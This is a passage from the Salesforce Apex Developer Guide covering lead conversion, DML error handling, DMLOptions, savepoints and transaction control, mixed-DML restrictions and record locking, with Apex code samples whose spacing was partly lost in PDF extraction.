5.The application uses the query (SELECT... FROMLeadStatusWHEREIsConverted=true) to obtain the leads
with converted status.
6.The application calls convertLead.
7.The application iterates through the returned result or results and examines each LeadConvertResult object to determine whether
conversion succeeded for each lead.
8.Optionally, when converting leads owned by a queue, the owner must be specified. This is because accounts and contacts can’t be
owned by a queue. Even if you are specifying an existing account or contact, you must still specify an owner.
Example
This example shows how to use the Database.convertLead method to convert a lead. It inserts a new lead, creates a
LeadConvert object, sets its status to converted, and then passes it to the Database.convertLead method. Finally, it verifies
that the conversion was successful.
LeadmyLead= new Lead(LastName= 'Fry', Company='FryAnd Sons');
insertmyLead;
Database.LeadConvertlc = new database.LeadConvert();
lc.setLeadId(myLead.id);
149
Working with Data in ApexApex Developer Guide

LeadStatusconvertStatus= [SELECTId, ApiNameFROMLeadStatusWHEREIsConverted=trueLIMIT
1];
lc.setConvertedStatus(convertStatus.ApiName);
Database.LeadConvertResultlcr = Database.convertLead(lc);
System.assert(lcr.isSuccess());
Convert Leads Considerations
•
Field mappings: The system automatically maps standard lead fields to standard account, contact, and opportunity fields. For custom
lead fields, your Salesforce administrator can specify how they map to custom account, contact, and opportunity fields. For more
information about field mappings, see Salesforce Help.
•
Merged fields: If data is merged into existing account and contact objects, only empty fields in the target object are
overwritten—existing data (including IDs) are not overwritten. The only exception is if you specify setOverwriteLeadSource
on the LeadConvert object to true, in which case the LeadSource field in the target contact object is overwritten with the
contents of the LeadSource field in the source LeadConvert object.
•
Record types: If the organization uses record types, the default record type of the new owner is assigned to records created during
lead conversion. The default record type of the user converting the lead determines the lead source values available during conversion.
If the desired lead source values are not available, add the values to the default record type of the user converting the lead. For more
information about record types, see Salesforce Help.
•
Picklist values: The system assigns the default picklist values for the account, contact, and opportunity when mapping any standard
lead picklist fields that are blank. If your organization uses record types, blank values are replaced with the default picklist values of
the new record owner.
•
Automatic feed subscriptions: When you convert a lead into a new account, contact, and opportunity, the lead owner is unsubscribed
from the lead record’s Chatter feed. The lead owner, the owner of the generated records, and users that were subscribed to the lead
aren’t automatically subscribed to the generated records, unless they have automatic subscriptions enabled in their Chatter feed
settings. They must have automatic subscriptions enabled to see changes to the account, contact, and opportunity records in their
news feed. To subscribe to records they create, users must enable the AutomaticallyfollowrecordsthatI
create option in their personal settings. A user can subscribe to a record so that changes to the record display in the news feed
on the user's home page. This is a useful way to stay up-to-date with changes to records in Salesforce.
SEE ALSO:
Apex Reference Guide: Database Class
Exception Handling
DML statements return run-time exceptions if something went wrong in the database during the execution of the DML operations. You
can handle the exceptions in your code by wrapping your DML statements within try-catch blocks. The following example includes the
insert DML statement inside a try-catch block.
Accounta = new Account(Name='Acme');
try {
inserta;
} catch(DmlExceptione) {
// Processexceptionhere
}
150
Working with Data in ApexApex Developer Guide

Database Class Method Result Objects
Returned Database Errors
Database Class Method Result Objects
Database class methods return the results of the data operation. These result objects contain useful information about the data operation
for each record, such as whether the operation was successful or not, and any error information. Each type of operation returns a specific
result object type, as outlined below.
Result ClassOperation
SaveResult Classinsert, update
UpsertResult Classupsert
MergeResult Classmerge
DeleteResult Classdelete
UndeleteResult Classundelete
LeadConvertResult ClassconvertLead
EmptyRecycleBinResult ClassemptyRecycleBin
Returned Database Errors
While DML statements always return exceptions when an operation fails for one of the records being processed and the operation is
rolled back for all records, Database class methods can either do so or allow partial success for record processing. In the latter case of
partial processing, Database class methods don’t throw exceptions. Instead, they return a list of errors for any errors that occurred on
failed records.
The errors provide details about the failures and are contained in the result of the Database class method. For example, a SaveResult
object is returned for insert and update operations. Like all returned results, SaveResult contains a method called getErrors
that returns a list of Database.Error objects, representing the errors encountered, if any.
Example
This example shows how to get the errors returned by a Database.insert operation. It inserts two accounts, one of which doesn’t
have the required Name field, and sets the second parameter to false: Database.insert(accts,false);. This sets the
partial processing option. Next, the example checks if the call had any failures through if (!sr.isSuccess()) and then iterates
through the errors, writing error information to the debug log.
// Createtwo accounts,one of whichis missinga requiredfield
Account[]accts= new List<Account>{
new Account(Name='Account1'),
new Account()};
Database.SaveResult[]srList= Database.insert(accts,false);
// Iteratethrougheachreturnedresult
for (Database.SaveResultsr : srList){
if (!sr.isSuccess()){
// Operationfailed,so get all errors
for(Database.Errorerr : sr.getErrors()){
151
Working with Data in ApexApex Developer Guide

System.debug('Thefollowingerrorhas occurred.');
System.debug(err.getStatusCode()+ ': ' + err.getMessage());
System.debug('Fieldsthataffectedthiserror:' + err.getFields());
}
}
}
More About DML
Here are some things you may want to know about using Data Manipulation Language.
Setting DML Options
Transaction Control
Read about transaction requests, generating and releasing savepoints, rolling back transactions, and more.
sObjects That Can’t Be Used Together in DML Operations
DML operations on certain sObjects, sometimes referred to as setup objects, can’t be mixed with DML on non-setup sObjects in the
same transaction. This restriction exists because some sObjects affect the user’s access to records in the org. You must insert or
update these types of sObjects in a different transaction to prevent operations from happening with incorrect access-level permissions.
For example, you can’t update an account and a user role in a single transaction.
sObjects That Don’t Support DML Operations
Bulk DML Exception Handling
Things You Should Know about Data in Apex
Setting DML Options
You can specify DML options for insert and update operations by setting the desired options in the Database.DMLOptions object.
You can set Database.DMLOptions for the operation by calling the setOptions method on the sObject, or by passing it as
a parameter to the Database.insert and Database.update methods.
Using DML options, you can specify:
•
The truncation behavior of fields.
•
Assignment rule information.
•
Duplicate rule information.
•
Whether automatic emails are sent.
•
The user locale for labels.
•
Whether the operation allows for partial success.
The Database.DMLOptions class has the following properties:
•
allowFieldTruncation Property
•
assignmentRuleHeader Property
•
duplicateRuleHeader
•
emailHeader Property
•
localeOptions Property
•
optAllOrNone Property
152
Working with Data in ApexApex Developer Guide

DMLOptions is only available for Apex saved against API versions 15.0 and higher. DMLOptions settings take effect only for record
operations performed using Apex DML and not through the Salesforce user interface.
allowFieldTruncation Property
The allowFieldTruncation property specifies the truncation behavior of strings. In Apex saved against API versions previous
to 15.0, if you specify a value for a string and that value is too large, the value is truncated. For API version 15.0 and later, if a value is
specified that is too large, the operation fails and an error message is returned. The allowFieldTruncation property allows you
to specify that the previous behavior, truncation, be used instead of the new behavior in Apex saved against API versions 15.0 and later.
The allowFieldTruncation property takes a Boolean value. If true, the property truncates String values that are too long,
which is the behavior in API versions 14.0 and earlier. For example:
Database.DMLOptionsdml = new Database.DMLOptions();
dml.allowFieldTruncation= true;
assignmentRuleHeader Property
The assignmentRuleHeader property specifies the assignment rule to be used when creating a case or lead.
Note:  The Database.DMLOptions object supports assignment rules for cases and leads, but not for accounts.
Using the assignmentRuleHeader property, you can set these options:
•
assignmentRuleID: The ID of an assignment rule for the case or lead. The assignment rule can be active or inactive. The ID
can be retrieved by querying the AssignmentRule sObject. If specified, do not specify useDefaultRule. If the value is not in
the correct ID format (15-character or 18-character Salesforce ID), the call fails and an exception is returned.
•
useDefaultRule: Indicates whether the default (active) assignment rule will be used for a case or lead. If specified, do not
specify an assignmentRuleId.
The following example uses the useDefaultRule option:
Database.DMLOptionsdmo = new Database.DMLOptions();
dmo.assignmentRuleHeader.useDefaultRule=true;
Leadl = new Lead(company='ABC', lastname='Smith');
l.setOptions(dmo);
insertl;
The following example uses the assignmentRuleID option:
Database.DMLOptionsdmo = new Database.DMLOptions();
dmo.assignmentRuleHeader.assignmentRuleId='01QD0000000EqAn';
Leadl = new Lead(company='ABC', lastname='Smith');
l.setOptions(dmo);
insertl;
Note:  If there are no assignment rules in the organization, in API version 29.0 and earlier, creating a case or lead with
useDefaultRule set to true results in the case or lead being assigned to the predefined default owner. In API version 30.0
and later, the case or lead is unassigned and doesn't get assigned to the default owner.
153
Working with Data in ApexApex Developer Guide

duplicateRuleHeader Property
The duplicateRuleHeader property determines whether a record that’s identified as a duplicate can be saved. Duplicate rules
are part of the Duplicate Management feature.
Using the duplicateRuleHeader property, you can set these options.
•
allowSave: Indicates whether a record that’s identified as a duplicate can be saved.
The following example shows how to save an account record that’s been identified as a duplicate. To learn how to iterate through
duplicate errors, see DuplicateError Class
Database.DMLOptionsdml = new Database.DMLOptions();
dml.DuplicateRuleHeader.AllowSave= true;
AccountduplicateAccount= new Account(Name='dupe');
Database.SaveResultsr = Database.insert(duplicateAccount,dml);
if (sr.isSuccess()){
System.debug('Duplicateaccounthas beeninsertedin Salesforce!');
}
emailHeader Property
The Salesforce user interface allows you to specify whether or not to send an email when the following events occur:
•
Creation of a new case or task
•
Conversion of a case email to a contact
•
New user email notification
•
Lead queue email notification
•
Password reset
In Apex saved against API version 15.0 or later, the Database.DMLOptions emailHeader property enables you to specify additional
information regarding the email that gets sent when one of the events occurs because of Apex DML code execution.
Using the emailHeader property, you can set these options.
•
triggerAutoResponseEmail: Indicates whether to trigger auto-response rules (true) or not (false), for leads and cases.
This email can be automatically triggered by a number of events, for example when creating a case or resetting a user password. If
this value is set to true, when a case is created, if there is an email address for the contact specified in ContactID, the email is
sent to that address. If not, the email is sent to the address specified in SuppliedEmail.
•
triggerOtherEmail: Indicates whether to trigger email outside the organization (true) or not (false). This email can be
automatically triggered by creating, editing, or deleting a contact for a case.
•
triggerUserEmail: Indicates whether to trigger email that is sent to users in the organization (true) or not (false). This
email can be automatically triggered by a number of events; resetting a password, creating a new user, or creating or modifying a
task.
Note:  Adding comments to a case in Apex doesn’t trigger email to users in the organization even if triggerUserEmail
is set to true.
Even though auto-sent emails can be triggered by actions in the Salesforce user interface, the DMLOptions settings for emailHeader
take effect only for DML operations carried out in Apex code.
In the following example, the triggerAutoResponseEmail option is specified:
Accounta = new Account(name='AcmePlumbing');
154
Working with Data in ApexApex Developer Guide

inserta;
Contactc = new Contact(email='jplumber@salesforce.com', firstname='Joe',lastname='Plumber',
accountid=a.id);
insertc;
Database.DMLOptionsdlo = new Database.DMLOptions();
dlo.EmailHeader.triggerAutoResponseEmail= true;
Caseca = new Case(subject='PlumbingProblems', contactid=c.id);
database.insert(ca,dlo);
Email sent through Apex because of a group event includes additional behaviors. A group event is an event for which IsGroupEvent
is true. The EventAttendee object tracks the users, leads, or contacts that are invited to a group event. Note the following behaviors for
group event email sent through Apex:
•
Sending a group event invitation to a user respects the triggerUserEmail option
•
Sending a group event invitation to a lead or contact respects the triggerOtherEmail option
•
Email sent when updating or deleting a group event also respects the triggerUserEmail and triggerOtherEmail
options, as appropriate
localeOptions Property
The localeOptions property specifies the language of any labels that are returned by Apex. The value must be a valid user locale
(language and country), such as de_DE or en_GB. The value is a String, 2-5 characters long. The first two characters are always an ISO
language code, for example 'fr' or 'en.' If the value is further qualified by a country, then the string also has an underscore (_) and another
ISO country code, for example 'US' or 'UK.' For example, the string for the United States is 'en_US', and the string for French Canadian is
'fr_CA'.
optAllOrNone Property
The optAllOrNone property specifies whether the operation allows for partial success. If optAllOrNone is set to true, all
changes are rolled back if any record causes errors. The default for this property is false and successfully processed records are
committed while records with errors aren't. This property is available in Apex saved against Salesforce API version 20.0 and later.
Transaction Control
Read about transaction requests, generating and releasing savepoints, rolling back transactions, and more.
All requests are delimited by the trigger, class method, Web Service, Visualforce page, or anonymous block that executes the Apex code.
If the entire request completes successfully, all changes are committed to the database. For example, suppose a Visualforce page called
an Apex controller, which in turn called an additional Apex class. Only when all the Apex code has finished running and the Visualforce
page has finished running, are the changes committed to the database. If the request doesn’t complete successfully, all database changes
are rolled back.
Generating Savepoints and Rolling Back Transactions
Sometimes during the processing of records, your business rules require that partial work (already executed DML statements) is rolled
back so that the processing can continue in another direction. Apex gives you the ability to generate a savepoint, that is, a point in the
155
Working with Data in ApexApex Developer Guide

request that specifies the state of the database at that time. Any DML statement that occurs after the savepoint can be discarded, restoring
the database to the condition it was in when you generated the savepoint. All table and row locks acquired since the savepoint are
released.
The following limitations apply to generating savepoint variables and rolling back the database:
•
If you set more than one savepoint, then roll back to a savepoint that isn’t the last savepoint you generated, the later savepoint
variable is also rolled back and becomes invalid. For example, if you generated savepoint SP1 first, savepoint SP2 after that, and
then you rolled back to SP1, the variable SP2 is no longer valid. If you try to use savepoint SP2, you receive a runtime error.
•
References to savepoints can’t cross-trigger invocations because each trigger invocation is a new trigger context. If you declare a
savepoint as a static variable then try to use it across trigger contexts, you receive a run-time error.
•
Each savepoint you set counts against the governor limit for DML statements.
•
Static variables aren’t reverted during a rollback. If you try to run the trigger again, the static variables retain the values from the first
run.
•
Database.rollback(Savepoint) and Database.setSavepoint()don’t count against the DML row limit, but
count toward the DML statement limit. This behavior applies to all API versions.
•
The ID on an sObject inserted after setting a savepoint isn’t cleared after a rollback. Attempting to insert the sObject using the variable
created before the rollback fails because the sObject variable has an ID. Updating or upserting the sObject using the same variable
also fails because the sObject isn’t in the database and, thus, can’t be updated. To perform further DML operations, create an sObject
variable without setting its ID.
The following is an example using the setSavepoint and rollback Database methods.
Accounta = new Account(Name= 'xyz');
inserta;
Assert.isNull([SELECTAccountNumberFROMAccountWHEREId  = :a.Id].AccountNumber);
// Createa savepointwhileAccountNumberis null
Savepointsp = Database.setSavepoint();
// Changethe accountnumber
a.AccountNumber= '123';
updatea;
Assert.areEqual('123',[SELECTAccountNumberFROMAccountWHEREId  = :a.Id].
AccountNumber);
// Rollbackto the previousnullvalue
Database.rollback(sp);
Assert.isNull([SELECTAccountNumberFROMAccountWHEREId  = :a.Id].AccountNumber);
Releasing Savepoints and Using Callouts
To allow callouts, roll back all uncommitted DML by using a savepoint. Then use the Database.releaseSavepoint method
to explicitly release savepoints before making the desired callout. When Database.releaseSavepoint() is called,
SAVEPOINT_RELEASE is logged.
See releaseSavepoint() for more information.
In this example, the makeACallout() callout succeeds because the uncommitted DML is rolled back and the savepoint is released.
Savepointsp = Database.setSavepoint();
try {
// Try a databaseoperation
insertnew Account(name='Foo');
integerbang= 1 / 0;
} catch(Exceptionex) {
156
Working with Data in ApexApex Developer Guide

Database.rollback(sp);
Database.releaseSavepoint(sp);
makeACallout();
}
In this example, the savepoint isn’t released before making the callout. The CalloutException informs you that you must release
all active savepoints before making the callout.
Savepointsp = Database.setSavepoint();
try {
makeACallout();
} catch(System.CalloutExceptionex) {
Assert.isTrue(ex.getMessage().contains('AllactiveSavepointsmustbe releasedbefore
makingcallouts.'));
}
In this example, DML is pending when the callout is made. The CalloutException informs you that you must roll back the
transaction before the callout is made or the transaction must be committed.
Savepointsp = Database.setSavepoint();
insertnew Account(name='Foo');
Database.releaseSavepoint(sp);
try {
makeACallout();
} catch(System.CalloutExceptionex) {
Assert.isTrue(ex.getMessage().contains('Youhaveuncommittedworkpending.Pleasecommit
or rollbackbeforecallingout.'));
}
Use these guidelines for using callouts and savepoints.
•
If there’s uncommitted work pending when Database.releaseSavepoint() is called, the uncommitted work isn’t rolled
back. It’s committed if the transaction succeeds.
•
Attempts to roll back to a released savepoint result in a TypeException.
•
Attempts to roll back after calling Database.releaseSavepoint() result in a
System.InvalidOperationException.
•
Calling the Database.releaseSavepoint() method on a savepoint also releases nested savepoints, that is, any subsequent
savepoints created after a savepoint.
Versioned Behavior Changes
For Apex tests with API version 60.0 or later, all savepoints are released when Test.startTest() and Test.stopTest()
are called. If any savepoints are reset, a SAVEPOINT_RESET event is logged.
Before API version 60.0, making a callout after creating savepoints throws a CalloutException regardless of whether there was
uncommitted DML or the changes were rolled back to a savepoint. Also, before API version 60.0, both
Database.rollback(databaseSavepoint) and Database.setSavepoint() calls incremented the DML row usage
limit.
157
Working with Data in ApexApex Developer Guide

sObjects That Can’t Be Used Together in DML Operations
DML operations on certain sObjects, sometimes referred to as setup objects, can’t be mixed with DML on non-setup sObjects in the
same transaction. This restriction exists because some sObjects affect the user’s access to records in the org. You must insert or update
these types of sObjects in a different transaction to prevent operations from happening with incorrect access-level permissions. For
example, you can’t update an account and a user role in a single transaction.
Don’t include more than one of these sObjects in the same transaction when performing DML operations or when using the Metadata
API.
These sObjects also can't be used with the @IsTest (IsParallel=true) annotation. Split such operations into separate transactions.
Note:  This list includes sObjects that cannot be used together in the same DML transaction, but is not an exhaustive list.
•
AuthSession
•
ContentWorkspace
•
FieldPermissions
•
ForecastingShare
•
Group
You can only insert and update a group in a transaction with other sObjects. Other DML operations aren’t allowed.
•
GroupMember
Note:  With legacy Apex code saved using Salesforce API version 14.0 and earlier, you can insert and update a group member
with other sObjects in the same transaction.
•
ObjectPermissions
•
ObjectTerritory2AssignmentRule
•
ObjectTerritory2AssignmentRuleItem
•
PermissionSet
•
PermissionSetAssignment
•
QueueSObject
•
RuleTerritory2Association
•
SetupEntityAccess
•
Territory
•
Territory2
•
Territory2Model
•
User
You can insert a user in a transaction with other sObjects in Apex code saved using Salesforce API version 14.0 and earlier.
You can insert a user in a transaction with other sObjects in Apex code saved using Salesforce API version 15.0 and later when
UserRoleId is specified as null.
You can update a user in a transaction with other sObjects in Apex code saved using Salesforce API version 14.0 and earlier
You can update a user in a transaction with other sObjects in Apex code saved using Salesforce API version 15.0 and later when the
user isn’t included in a Lightning Sync or Einstein Activity Capture configuration (either active or inactive) and the following fields
aren’t updated:
–
UserRoleId
–
IsActive
158
Working with Data in ApexApex Developer Guide

–
ForecastEnabled
–
IsPortalEnabled
–
Username
–
ProfileId
•
UserPackageLicense
•
UserRole
•
UserTerritory
•
UserTerritory2Association
If you're using a Visualforce page with a custom controller, you can't mix sObject types with any of these special sObjects within a single
request or action. However, you can perform DML operations on these different types of sObjects in subsequent requests. For example,
you can create an account with a save button, and then create a user with a non-null role with a submit button.
You can perform DML operations on more than one type of sObject in a single class using the following process:
1.Create a method that performs a DML operation on one type of sObject.
2.Create a second method that uses the future annotation to manipulate a second sObject type.
This process is demonstrated in the example in the next section.
Example: Using a Future Method to Perform Mixed DML Operations
This example shows how to perform mixed DML operations by using a future method to perform a DML operation on the User object.
publicclassMixedDMLFuture{
publicstaticvoiduseFutureMethod(){
// FirstDML operation
Accounta = new Account(Name='Acme');
inserta;
// Thisnextoperation(inserta userwitha role)
// can'tbe mixedwiththe previousinsertunless
// it is withina futuremethod.
// Callfuturemethodto inserta userwitha role.
Util.insertUserWithRole(
'mruiz@awcomputing.com', 'mruiz',
'mruiz@awcomputing.com', 'Ruiz');
}
}
publicclassUtil{
@future
publicstaticvoidinsertUserWithRole(
Stringuname,Stringal, Stringem, Stringlname){
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
UserRoler = [SELECTId FROMUserRoleWHEREName='COO'];
// Createnew userwitha non-nulluserroleID
Useru = new User(alias= al, email=em,
emailencodingkey='UTF-8', lastname=lname,
languagelocalekey='en_US',
localesidkey='en_US', profileid= p.Id,userroleid= r.Id,
timezonesidkey='America/Los_Angeles',
159
Working with Data in ApexApex Developer Guide

username=uname);
insertu;
}
}
Mixed DML Operations in Test Methods
Test methods allow for performing mixed Data Manipulation Language (DML) operations that include both setup sObjects and
other sObjects if the code that performs the DML operations is enclosed within System.runAs method blocks. You can also
perform DML in an asynchronous job that your test method calls. These techniques enable you, for example, to create a user with
a role and other sObjects in the same test.
Mixed DML Operations in Test Methods
Test methods allow for performing mixed Data Manipulation Language (DML) operations that include both setup sObjects and other
sObjects if the code that performs the DML operations is enclosed within System.runAs method blocks. You can also perform DML
in an asynchronous job that your test method calls. These techniques enable you, for example, to create a user with a role and other
sObjects in the same test.
The setup sObjects are listed in sObjects That Cannot Be Used Together in DML Operations.
Note:  Because validation for mixed DML operations is skipped during deployment, there can be a difference in the number of
test failures when tests are deployed versus when run in the user interface.
Example: Mixed DML Operations in System.runAs Blocks
This example shows how to enclose mixed DML operations within System.runAs blocks to avoid the mixed DML error. The
System.runAs block runs in the current user’s context. It creates a test user with a role and a test account, which is a mixed DML
operation.
@isTest
privateclassMixedDML{
statictestMethodvoidmixedDMLExample(){
Useru;
Accounta;
UserthisUser= [SELECTId FROMUserWHEREId = :UserInfo.getUserId()];
// Insertaccountas currentuser
System.runAs(thisUser){
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
UserRoler = [SELECTId FROMUserRoleWHEREName='COO'];
u = new User(alias= 'jsmith', email='jsmith@acme.com',
emailencodingkey='UTF-8', lastname='Smith',
languagelocalekey='en_US',
localesidkey='en_US', profileid= p.Id,userroleid= r.Id,
timezonesidkey='America/Los_Angeles',
username='jsmith@acme.com');
insertu;
a = new Account(name='Acme');
inserta;
}
}
}
160
Working with Data in ApexApex Developer Guide

Use @future to Bypass the Mixed DML Error in a Test Method
Mixed DML operations within a single transaction aren’t allowed. You can’t perform DML on a setup sObject and another sObject in the
same transaction. However, you can perform one type of DML as part of an asynchronous job and the others in other asynchronous jobs
or in the original transaction. This class contains an @future method to be called by the class in the subsequent example.
publicclassInsertFutureUser{
@future
publicstaticvoidinsertUser(){
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
UserRoler = [SELECTId FROMUserRoleWHEREName='COO'];
UserfutureUser= new User(firstname= 'Future', lastname= 'User',
alias= 'future', defaultgroupnotificationfrequency= 'N',
digestfrequency= 'N', email= 'test@test.org',
emailencodingkey= 'UTF-8', languagelocalekey='en_US',
localesidkey='en_US', profileid= p.Id,
timezonesidkey= 'America/Los_Angeles',
username= 'futureuser@test.org',
userpermissionsmarketinguser= false,
userpermissionsofflineuser= false, userroleid= r.Id);
insert(futureUser);
}
}
This class calls the method in the previous class.
@isTest
publicclassUserAndContactTest{
publictestmethodstaticvoidtestUserAndContact(){
InsertFutureUser.insertUser();
ContactcurrentContact= new Contact(
firstName= String.valueOf(System.currentTimeMillis()),
lastName= 'Contact');
insert(currentContact);
}
}
sObjects That Don’t Support DML Operations
Your organization contains standard objects provided by Salesforce and custom objects that you created. These objects can be accessed
in Apex as instances of the sObject data type. You can query these objects and perform DML operations on them. However, some
standard objects don’t support DML operations although you can still obtain them in queries. The following is a non-exhaustive list of
such objects:
•
AccountTerritoryAssignmentRule
•
AccountTerritoryAssignmentRuleItem
•
ApexComponent
•
ApexPage
•
BusinessHours
•
BusinessProcess
•
CategoryNode
•
CurrencyType
161
Working with Data in ApexApex Developer Guide

•
DatedConversionRate
•
NetworkMember (allows update only)
•
ProcessInstance
•
Profile
•
RecordType
•
SelfServiceUser
•
StaticResource
•
Territory2
•
UserAccountTeamMember
•
UserPreference
•
UserTerritory
•
WebLink
The following are special cases of DML operations on objects.
•
If an Account record has a record type of Person Account, the Name field can’t be modified with DML operations.
•
All standard and custom objects can also be accessed through the SOAP API. ProcessInstance is an exception. You can’t create,
update, or delete ProcessInstance in the SOAP API.
•
DML operations aren't supported on Data Cloud data model objects (DMOs). For details on using Apex with Data Cloud objects, see
Data Cloud in Apex.
•
To determine if DML is supported on your specific object, use the Schema.describeSObjects()method as shown in this
sample code.
// Thisexampledescribesthe ApexPageobject.Replaceit withyour
// objects(s)in the resultslistto checkif DML is permitted.
List<Schema.DescribeSobjectResult>results= Schema.describeSObjects(newList<string>
{'ApexPage'},SObjectDescribeOptions.DEFERRED);
DescribeSObjectResultd = results[0];
System.debug('isCreateable():'+ d.isCreateable());
System.debug('isUpdateable():'+ d.isUpdateable());
System.debug('isQueryable():' + d.isQueryable());
Bulk DML Exception Handling
Exceptions that arise from a bulk DML call (including any recursive DML operations in triggers that are fired as a direct result of the call)
are handled differently depending on where the original call came from:
•
When errors occur because of a bulk DML call that originates directly from the Apex DML statements, or if the allOrNone
parameter of a Database DML method is set to true, the runtime engine follows the “all or nothing” rule: during a single operation,
all records must be updated successfully or the entire operation rolls back to the point immediately preceding the DML statement.
If the allOrNone parameter of a Database DML method is set to false and a record fails, the remainder of the DML operation
can still succeed. You must iterate through the returned results to identify which records succeeded or failed. If the allOrNone
parameter of a Database DML method is set to false and a before-trigger assigns an invalid value to a field, the partial set of valid
records isn’t inserted.
•
When errors occur because of a bulk DML call that originates from SOAP API with default settings, or if the allOrNone parameter
of a Database DML method was specified as false, the runtime engine attempts at least a partial save:
1.During the first attempt, the runtime engine processes all records. Any record that generates an error due to issues such as
validation rules or unique index violations is set aside.
162
Working with Data in ApexApex Developer Guide

2.If there were errors during the first attempt, the runtime engine makes a second attempt that includes only those records that
didn’t generate errors. All records that didn't generate an error during the first attempt are processed, and if any record generates
an error (perhaps because of race conditions) it’s also set aside.
3.If there were additional errors during the second attempt, the runtime engine makes a third and final attempt that includes only
those records that didn’t generate errors during the first and second attempts. If any record generates an error, the entire operation
fails with the error message, “Too many batch retries in the presence of Apex triggers and partial failures.”
Note:
–
During the second and third attempts, governor limits are reset to their original state before the first attempt. See Execution
Governors and Limits on page 346.
–
Apex triggers are fired for the first save attempt, and if errors are encountered for some records and subsequent attempts
are made to save the subset of successful records, triggers are refired on this subset of records.
Things You Should Know about Data in Apex
Non-Null Required Fields Values and Null Fields
When inserting new records or updating required fields on existing records, you must supply non-null values for all required fields.
Unlike the SOAP API, Apex allows you to change field values to null without updating the fieldsToNull array on the sObject
record. The API requires an update to this array due to the inconsistent handling of null values by many SOAP providers. Because
Apex runs solely on the Lightning Platform, this workaround is unnecessary.
DML Not Supported with Some sObjects
DML operations are not supported with certain sObjects. See sObjects That Don’t Support DML Operations.
String Field Truncation and API Version
Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String value
that is too long for the field.
sObject Properties to Enable DML Operations
To be able to insert, update, delete, or undelete an sObject record, the sObject must have the corresponding property (createable,
updateable, deletable, or undeletable respectively) set to true.
ID Values
The insert statement automatically sets the ID value of all new sObject records. Inserting a record that already has an ID—and
therefore already exists in your organization's data—produces an error. See Lists for more information.
The insert and update statements check each batch of records for duplicate ID values. If there are duplicates, the first five are
processed. For the sixth and all additional duplicate IDs, the SaveResult for those entries is marked with an error similar to the following:
Maximumnumberof duplicateupdatesin one batch(5 allowed).Attemptto updateId
morethanoncein thisAPI call:number_of_attempts.
The ID of an updated sObject record cannot be modified in an update statement, but related record IDs can.
Fields With Unique Constraints
For some sObjects that have fields with unique constraints, inserting duplicate sObject records results in an error. For example,
inserting CollaborationGroup sObjects with the same names results in an error because CollaborationGroup records must have
unique names.
System Fields Automatically Set
When inserting new records, system fields such as CreatedDate, CreatedById, and SystemModstamp are automatically
updated. You cannot explicitly specify these values in your Apex. Similarly, when updating records, system fields such as
LastModifiedDate, LastModifiedById, and SystemModstamp are automatically updated.
163
Working with Data in ApexApex Developer Guide

Maximum Number of Records Processed by DML Statement
You can pass a maximum of 10,000 sObject records to a single insert, update, delete, and undelete method.
Each upsert statement consists of two operations, one for inserting records and one for updating records. Each of these operations
is subject to the runtime limits for insert and update, respectively. For example, if you upsert more than 10,000 records and
all of them are being updated, you receive an error. (See Execution Governors and Limits on page 346)
Upsert and Foreign Keys
You can use foreign keys to upsert sObject records if they have been set as reference fields. For more information, see Field Types
in the Object Reference for Salesforce.
Creating Records for Multiple Object Types
As with the SOAP API, you can create records in Apex for multiple object types, including custom objects, in one DML call with API
version 20.0 and later. For example, you can create a contact and an account in one call. You can create records for up to 10 object
types in one call.
Records are saved in the same order that they’re entered in the sObject input array. If you’re entering new records that have a
parent-child relationship, the parent record must precede the child record in the array. For example, if you’re creating a contact that
references an account that’s also being created in the same call, the account must have a smaller index in the array than the contact
does. The contact references the account by using an ExternalID field.
You can’t add a record that references another record of the same object type in the same call. For example, the Contact object has
a ReportsTo field that’s a reference to another contact. You can’t create two contacts in one call if one contact uses the
ReportsTo field to reference a second contact in the input array. You can create a contact that references another contact that
has been previously created.
Records for multiple object types are broken into multiple chunks by Salesforce. A chunk is a subset of the input array, and each
chunk contains records of one object type. Data is committed on a chunk-by-chunk basis. Any Apex triggers that are related to the
records in a chunk are invoked once per chunk. Consider an sObject input array that contains the following set of records:
account1,account2,contact1,contact2,contact3,case1,account3,account4,contact4
Salesforce splits the records into five chunks:
1.account1,account2
2.contact1,contact2,contact3
3.case1
4.account3,account4
5.contact4
Each call can process up to 10 chunks. If the sObject array contains more than 10 chunks, you must process the records in more than
one call. For additional information about this feature, see Creating Records for Different Object Types in the SOAP API Developer
Guide.
Note:  For Apex, the chunking of the input array for an insert or update DML operation has two possible causes: the existence
of multiple object types or the default chunk size of 200. If chunking in the input array occurs because of both of these reasons,
each chunk is counted toward the limit of 10 chunks. If the input array contains only one type of sObject, you won’t hit this
limit. However, if the input array contains at least two sObject types and contains a high number of objects that are chunked
into groups of 200, you might hit this limit. For example, if you have an array that contains 1,001 consecutive leads followed
by 1,001 consecutive contacts, the array will be chunked into 12 groups: Two groups are due to the different sObject types of
Lead and Contact, and the remaining are due to the default chunking size of 200 objects. In this case, the insert or update
operation returns an error because you reached the limit of 10 chunks in hybrid arrays. The workaround is to call the DML
operation for each object type separately.
164
Working with Data in ApexApex Developer Guide

DML and Knowledge Objects
To execute DML code on knowledge articles (KnowledgeArticleVersion types such as the custom FAQ__kav article type), the running
user must have the Knowledge User feature license. Otherwise, calling a class method that contains DML operations on knowledge
articles results in errors. If the running user isn’t a system administrator and doesn’t have the Knowledge User feature license, calling
any method in the class returns an error even if the called method doesn’t contain DML code for knowledge articles but another
method in the class does. For example, the following class contains two methods, only one of which performs DML on a knowledge
article. A non-administrator non-knowledge user who calls the doNothing method will get the following error: DML operation
UPDATEnot allowedon FAQ__kav
publicclassKnowledgeAccess{
publicvoiddoNothing(){
}
publicvoidDMLOperation(){
FAQ__kav[]articles= [SELECTId FROMFAQ__kavWHEREPublishStatus= 'Draft'and
Language= 'en_US'];
updatearticles;
}
}
As a workaround, cast the input array to the DML statement from an array of FAQ__kav articles to an array of the generic sObject
type as follows:
publicvoidDMLOperation(){
FAQ__kav[]articles= [SELECTid FROMFAQ__kavWHEREPublishStatus= 'Draft'and
Language= 'en_US'];
update(sObject[])articles;
}
Locking Records
When an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user interface.
The client locking the records can perform logic on the records and make updates with the guarantee that the locked records won’t be
changed by another client during the lock period.
Locking Statements
In Apex, you can use FOR UPDATE to lock sObject records while they’re being updated in order to prevent race conditions and
other thread safety problems.
Locking in a SOQL For Loop
Avoiding Deadlocks
Locking Statements
